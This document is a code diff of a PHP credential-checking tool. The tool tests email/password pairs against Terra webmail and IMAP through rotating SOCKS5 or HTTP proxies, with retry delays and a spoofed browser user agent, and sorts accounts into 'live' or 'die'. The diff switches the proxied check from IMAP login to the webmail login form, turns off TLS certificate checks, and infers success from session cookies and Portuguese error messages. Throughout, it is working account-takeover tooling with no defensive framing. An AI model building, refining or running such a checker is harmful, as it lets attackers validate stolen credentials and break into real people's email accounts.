@@ -92,11 +92,7 @@ if ($action === 'diag_proxy') {
     );
     curl_close($ch);
 
-    if ($p['type'] === 'socks5') {
-        $diag['tests']['socks5_manual'] = testSocks5Connect($proxy, 20);
-    } else {
-        $diag['tests']['http_connect_manual'] = testHttpConnect($proxy, 20);
-    }
+    $diag['tests']['webmail_https'] = testWebmailAccess($proxy, 20);
 
     ob_end_clean();
     echo json_encode($diag, JSON_PRETTY_PRINT);
@@ -177,6 +173,21 @@ function testProxy($proxy) {
     return ($result !== false && strlen(trim($result)) > 0);
 }
 
+function applyProxyToCurl($ch, $proxy) {
+    $p = parseProxy($proxy);
+    if (empty($p['host'])) return;
+    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
+    if ($p['type'] === 'socks5') {
+        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
+    } else {
+        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
+        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+    }
+    if (!empty($p['user'])) {
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
+    }
+}
+
 function doValidate($email, $password, $proxy) {
     $timeout = 20;
     $delays = array(0, 2000000, 4000000, 7000000, 10000000);
@@ -185,231 +196,153 @@ function doValidate($email, $password, $proxy) {
         if ($delays[$attempt] > 0) usleep($delays[$attempt]);
 
         if (!empty($proxy)) {
-            $p = parseProxy($proxy);
-            if ($p['type'] === 'socks5') {
-                $r = trySocks5Imap($email, $password, $timeout, $p);
-                if ($r !== null) return $r;
-            } else {
-                $r = tryHttpConnectImap($email, $password, $timeout, $p);
-                if ($r !== null) return $r;
-            }
-        } else {
-            if (extension_loaded('curl')) {
-                $r = tryCurlDirect($email, $password, $timeout);
-                if ($r !== null) return $r;
-            }
-            $r = trySocketDirect($email, $password, $timeout);
+            $r = tryWebmailProxy($email, $password, $timeout, $proxy);
             if ($r !== null) return $r;
         }
+
+        if (extension_loaded('curl')) {
+            $r = tryCurlDirect($email, $password, $timeout);
+            if ($r !== null) return $r;
+        }
+        $r = trySocketDirect($email, $password, $timeout);
+        if ($r !== null) return $r;
     }
 
     return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
 }
 
-function trySocks5Imap($email, $password, $timeout, $p) {
-    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
-    if ($socket === false) return null;
-    stream_set_timeout($socket, $timeout);
-    stream_set_blocking($socket, true);
+function tryWebmailProxy($email, $password, $timeout, $proxy) {
+    if (!extension_loaded('curl')) return null;
+    $p = parseProxy($proxy);
+    if (empty($p['host'])) return null;
 
-    fwrite($socket, chr(5) . chr(2) . chr(0) . chr(2));
-    $greeting = @fread($socket, 2);
-    if (strlen($greeting) < 2) { fclose($socket); return null; }
-    $method = ord($greeting[1]);
+    $cookieFile = '/tmp/terra_' . md5($email . microtime()) . '.txt';
 
-    if ($method === 2) {
-        $u = $p['user'];
-        $s = $p['pass'];
-        $auth = chr(1) . chr(strlen($u)) . $u . chr(strlen($s)) . $s;
-        fwrite($socket, $auth);
-        $authResp = @fread($socket, 2);
-        if (strlen($authResp) < 2 || ord($authResp[1]) !== 0) { fclose($socket); return null; }
-    } elseif ($method !== 0) {
-        fclose($socket); return null;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
+    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
+    applyProxyToCurl($ch, $proxy);
+    $pageResult = curl_exec($ch);
+    $pageCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($pageResult === false) return null;
+
+    $postFields = http_build_query(array(
+        'email' => $email,
+        'password' => $password,
+    ));
+
+    $ch2 = curl_init();
+    curl_setopt($ch2, CURLOPT_URL, 'https://mail.terra.com.br/login');
+    curl_setopt($ch2, CURLOPT_POST, true);
+    curl_setopt($ch2, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch2, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, false);
+    curl_setopt($ch2, CURLOPT_HEADER, true);
+    curl_setopt($ch2, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch2, CURLOPT_COOKIEJAR, $cookieFile);
+    curl_setopt($ch2, CURLOPT_COOKIEFILE, $cookieFile);
+    curl_setopt($ch2, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36');
+    curl_setopt($ch2, CURLOPT_HTTPHEADER, array(
+        'Content-Type: application/x-www-form-urlencoded',
+        'Referer: https://mail.terra.com.br/',
+        'Origin: https://mail.terra.com.br',
+    ));
+    applyProxyToCurl($ch2, $proxy);
+
+    $loginResult = curl_exec($ch2);
+    $loginCode = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
+    $loginErr = curl_error($ch2);
+    $loginErrno = curl_errno($ch2);
+    curl_close($ch2);
+
+    @unlink($cookieFile);
+
+    if ($loginResult === false) return null;
+
+    $lower = strtolower($loginResult);
+
+    if (preg_match('/Set-Cookie:\s*[A-Za-z0-9_]+(session|token|auth|zmsub|zmauth|jsessionid)/i', $loginResult)) {
+        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
     }
 
-    $target = 'imap.terra.com.br';
-    $connectReq = chr(5) . chr(1) . chr(0) . chr(3) . chr(strlen($target)) . $target . pack('n', 993);
-    fwrite($socket, $connectReq);
-
-    $resp = '';
-    $deadline = microtime(true) + $timeout;
-    while (strlen($resp) < 10 && !feof($socket) && microtime(true) < $deadline) {
-        $chunk = @fread($socket, 10 - strlen($resp));
-        if ($chunk === false || $chunk === '') { usleep(100000); continue; }
-        $resp .= $chunk;
+    if ($loginCode === 302 || $loginCode === 301) {
+        if (strpos($lower, 'login') === false || strpos($lower, 'error') === false) {
+            return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
+        }
     }
-    if (strlen($resp) < 10 || ord($resp[1]) !== 0) { fclose($socket); return null; }
 
-    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }
-    return doImapLogin($socket, $email, $password, $timeout);
-}
+    if ($loginCode === 200) {
+        if (strpos($lower, 'incorreta') !== false ||
+            strpos($lower, 'invalid') !== false ||
+            strpos($lower, 'incorrect') !== false ||
+            strpos($lower, 'senha incorreta') !== false ||
+            strpos($lower, 'usuario ou senha') !== false ||
+            strpos($lower, 'authentication failed') !== false ||
+            strpos($lower, 'erro ao acessar') !== false) {
+            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
+        }
 
-function tryHttpConnectImap($email, $password, $timeout, $p) {
-    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
-    if ($socket === false) return null;
-    stream_set_timeout($socket, $timeout);
-    stream_set_blocking($socket, true);
-
-    $target = 'imap.terra.com.br';
-    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . CRLF;
-    $req .= 'Host: ' . $target . ':993' . CRLF;
-    if (!empty($p['user'])) {
-        $auth = base64_encode($p['user'] . ':' . $p['pass']);
-        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
+        if (strpos($lower, 'acessar meu e-mail') !== false ||
+            (strpos($lower, 'e-mail') !== false && strpos($lower, 'senha') !== false && strlen($loginResult) < 5000)) {
+            return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
+        }
     }
-    $req .= 'Proxy-Connection: Keep-Alive' . CRLF . CRLF;
-    fwrite($socket, $req);
 
-    $resp = '';
-    $deadline = microtime(true) + $timeout;
-    while (!feof($socket) && microtime(true) < $deadline) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $resp .= $line;
-        if ($line === CRLF || $line === LF) break;
+    if ($loginCode === 401 || $loginCode === 403) {
+        return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
     }
-    if (stripos($resp, '200') === false) { fclose($socket); return null; }
 
-    if (!enableTLS($socket, $timeout)) { fclose($socket); return null; }
-    return doImapLogin($socket, $email, $password, $timeout);
-}
-
-function enableTLS($socket, $timeout) {
-    $deadline = microtime(true) + $timeout;
-    while (microtime(true) < $deadline) {
-        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
-        if ($r === true) return true;
-        if ($r === false) return false;
-        usleep(100000);
+    if (preg_match('/Set-Cookie:/i', $loginResult) && strpos($lower, 'error') === false && strpos($lower, 'incorreta') === false) {
+        return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
     }
-    return false;
-}
 
-function doImapLogin($socket, $email, $password, $timeout) {
-    $greeting = '';
-    $deadline = microtime(true) + $timeout;
-    while (!feof($socket) && microtime(true) < $deadline) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $greeting .= $line;
-        if (strpos($line, LF) !== false) break;
-    }
-    if (stripos($greeting, 'OK') === false) { fclose($socket); return null; }
-
-    $safe_email = addslashes($email);
-    $safe_pass = addslashes($password);
-    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
-    fwrite($socket, $cmd);
-
-    $response = '';
-    $deadline2 = microtime(true) + $timeout;
-    while (!feof($socket)) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $response .= $line;
-        if (strpos(trim($line), 'A1 ') === 0) break;
-        if (microtime(true) > $deadline2) break;
-    }
-    @fwrite($socket, 'A2 LOGOUT' . CRLF);
-    fclose($socket);
-
-    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
-    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
-    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
     return null;
 }
 
-function testSocks5Connect($proxy, $timeout) {
-    $p = parseProxy($proxy);
-    if (empty($p['host']) || empty($p['port'])) return array('ok' => false, 'err' => 'Parse failed');
+function testWebmailAccess($proxy, $timeout) {
+    if (!extension_loaded('curl')) return array('ok' => false, 'err' => 'no curl');
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'https://mail.terra.com.br/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
+    curl_setopt($ch, CURLOPT_HEADER, true);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+    applyProxyToCurl($ch, $proxy);
 
     $t0 = microtime(true);
-    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
-    if ($socket === false) return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('fsockopen: %s (%d)', $errstr, $errno));
-    stream_set_timeout($socket, $timeout);
-
-    fwrite($socket, chr(5) . chr(2) . chr(0) . chr(2));
-    $g = @fread($socket, 2);
-    if (strlen($g) < 2) { fclose($socket); return array('ok' => false, 'err' => 'SOCKS5 greeting failed'); }
-    $method = ord($g[1]);
-    if ($method === 2) {
-        $auth = chr(1) . chr(strlen($p['user'])) . $p['user'] . chr(strlen($p['pass'])) . $p['pass'];
-        fwrite($socket, $auth);
-        $ar = @fread($socket, 2);
-        if (strlen($ar) < 2 || ord($ar[1]) !== 0) { fclose($socket); return array('ok' => false, 'err' => 'SOCKS5 auth failed'); }
-    }
-    $target = 'imap.terra.com.br';
-    fwrite($socket, chr(5) . chr(1) . chr(0) . chr(3) . chr(strlen($target)) . $target . pack('n', 993));
-    $resp = '';
-    $dl = microtime(true) + $timeout;
-    while (strlen($resp) < 10 && microtime(true) < $dl) {
-        $c = @fread($socket, 10);
-        if ($c === false || $c === '') { usleep(50000); continue; }
-        $resp .= $c;
-    }
-    if (strlen($resp) < 10 || ord($resp[1]) !== 0) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'SOCKS5 connect to 993 rejected: ' . bin2hex($resp)); }
-
-    $tls = enableTLS($socket, $timeout);
-    if (!$tls) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS failed'); }
-
-    $greeting = '';
-    $dl2 = microtime(true) + $timeout;
-    while (!feof($socket) && microtime(true) < $dl2) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $greeting .= $line;
-        if (strpos($line, LF) !== false) break;
-    }
-    fclose($socket);
+    $res = curl_exec($ch);
+    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $err = curl_error($ch);
+    curl_close($ch);
     $timeMs = round((microtime(true) - $t0) * 1000);
-    if (stripos($greeting, 'OK') === false) return array('ok' => false, 'time_ms' => $timeMs, 'err' => 'No IMAP greeting', 'greeting' => substr($greeting, 0, 200));
-    return array('ok' => true, 'time_ms' => $timeMs, 'greeting' => substr($greeting, 0, 200));
-}
 
-function testHttpConnect($proxy, $timeout) {
-    $p = parseProxy($proxy);
-    if (empty($p['host']) || empty($p['port'])) return array('ok' => false, 'err' => 'Parse failed');
-
-    $t0 = microtime(true);
-    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
-    if ($socket === false) return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('fsockopen: %s (%d)', $errstr, $errno));
-    stream_set_timeout($socket, $timeout);
-
-    $target = 'imap.terra.com.br';
-    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . CRLF . 'Host: ' . $target . ':993' . CRLF;
-    if (!empty($p['user'])) {
-        $auth = base64_encode($p['user'] . ':' . $p['pass']);
-        $req .= 'Proxy-Authorization: Basic ' . $auth . CRLF;
-    }
-    $req .= CRLF;
-    fwrite($socket, $req);
-
-    $resp = '';
-    $dl = microtime(true) + $timeout;
-    while (!feof($socket) && microtime(true) < $dl) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $resp .= $line;
-        if ($line === CRLF || $line === LF) break;
-    }
-    if (stripos($resp, '200') === false) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'CONNECT rejected', 'response' => substr($resp, 0, 300)); }
-
-    $tls = enableTLS($socket, $timeout);
-    if (!$tls) { fclose($socket); return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS failed'); }
-
-    $greeting = '';
-    $dl2 = microtime(true) + $timeout;
-    while (!feof($socket) && microtime(true) < $dl2) {
-        $line = @fgets($socket, 8192);
-        if ($line === false) { usleep(50000); continue; }
-        $greeting .= $line;
-        if (strpos($line, LF) !== false) break;
-    }
-    fclose($socket);
-    $timeMs = round((microtime(true) - $t0) * 1000);
-    if (stripos($greeting, 'OK') === false) return array('ok' => false, 'time_ms' => $timeMs, 'err' => 'No IMAP greeting', 'greeting' => substr($greeting, 0, 200));
-    return array('ok' => true, 'time_ms' => $timeMs, 'greeting' => substr($greeting, 0, 200));
+    return array(
+        'ok' => $res !== false,
+        'http_code' => $code,
+        'time_ms' => $timeMs,
+        'err' => $err,
+        'headers' => $res !== false ? substr($res, 0, 1000) : null,
+    );
 }
 
 function tryCurlDirect($email, $password, $timeout) {
@@ -437,7 +370,10 @@ function trySocketDirect($email, $password, $timeout) {
     if ($socket === false) return null;
     stream_set_timeout($socket, $timeout);
     $greeting = @fgets($socket, 8192);
-    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
+    if (!$greeting || stripos($greeting, 'OK') === false) {
+        fclose($socket);
+        return null;
+    }
     $safe_email = addslashes($email);
     $safe_pass = addslashes($password);
     $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
